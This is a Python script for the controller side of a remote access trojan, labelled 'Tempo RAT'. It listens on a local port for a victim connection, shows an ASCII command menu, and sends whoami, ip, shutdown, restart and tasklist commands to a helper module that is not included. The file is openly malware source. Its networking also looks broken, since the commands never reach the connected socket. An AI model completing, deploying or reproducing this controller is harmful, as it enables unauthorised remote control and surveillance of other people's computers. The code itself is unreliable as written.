#Imports.
import socket, shutil, json, sys, subprocess, TempoModule, os, ctypes, time
from colorama import Fore as fore

os.system('cls')

#Server Config.
class Server:
    def __init__(self,ip,port):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((ip, port))
        server.listen(0)
        print(fore.LIGHTBLACK_EX + "Waiting for a connection")
        self.connection, address = server.accept()
        print(fore.LIGHTBLACK_EX + "Connected With " + str(address))
        print(fore.LIGHTBLACK_EX + """             
                    ╔╦╗╔═╗╔╦╗╔═╗╔═╗      ╦═╗╔═╗╔╦╗
                     ║ ║╣ ║║║╠═╝║ ║      ╠╦╝╠═╣ ║ 
                     ╩ ╚═╝╩ ╩╩  ╚═╝ ──── ╩╚═╩ ╩ ╩ 
                     ____________________________ 
                    |  ________________________  |
                    | |      -COMMANDS-        | |
                    | |      -Whoami-          | |
                    | |      -IP-              | |
                    | |      -Shutdown-        | |
                    | |      -Restart-         | |
                    | |      -Commandlist-     | |
                    | |      -Tasklist-        | |
                    | |      -Clear-           | |
                    | |      -Exit-            | |
                    | |________________________| |
                    |____________________________|
        """)

#Recieve Data.
    def RecieveData(self):
        Data = b""
        while True:
            try:
                Data += self.connection.recv(2048)
                return json.loads(Data)
            except ValueError:
                continue

#Send Data.
    def SendData(self, data):
        DataSend = json.dumps(data)
        self.connection.send(DataSend.encode())

    def sendMessage(conn,message):
        message = (message.encode())
        header = str(len(message))
        conn.send(header.encode())
        conn.send(message)

#Command Execution.
    def run(self):
        while True:
            command = input("TempoShell@ ")
            command = command.split(" ", 1)
            try:
                if command[0] == "whoami":
                    TempoModule.whoami()
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                if command[0] == "dir":
                    TempoModule.dir()
                if command[0] == "ip":
                    TempoModule.ip()
                if command[0] == "shutdown":
                    TempoModule.shutdown()
                if command[0] == "restart":
                    TempoModule.restart()
                if command[0] == "commandlist":
                    print(fore.LIGHTBLACK_EX + """             
                    ╔╦╗╔═╗╔╦╗╔═╗╔═╗      ╦═╗╔═╗╔╦╗
                     ║ ║╣ ║║║╠═╝║ ║      ╠╦╝╠═╣ ║ 
                     ╩ ╚═╝╩ ╩╩  ╚═╝ ──── ╩╚═╩ ╩ ╩ 
                     ____________________________ 
                    |  ________________________  |
                    | |      -COMMANDS-        | |
                    | |      -Whoami-          | |
                    | |      -IP-              | |
                    | |      -Shutdown-        | |
                    | |      -Restart-         | |
                    | |      -list-            | |
                    | |      -Tasklist-        | |
                    | |      -Clear-           | |
                    | |      -Exit-            | |
                    | |________________________| |
                    |____________________________|
        """)
                if command[0] == "tasklist":
                    TempoModule.tasklist()
                if command[0] == "clear":
                    TempoModule.clear()
            except Exception:
                print(fore.LIGHTBLACK_EX + "Error Running Command.")

TempoServer = Server("127.0.0.1", 7976)
TempoServer.run()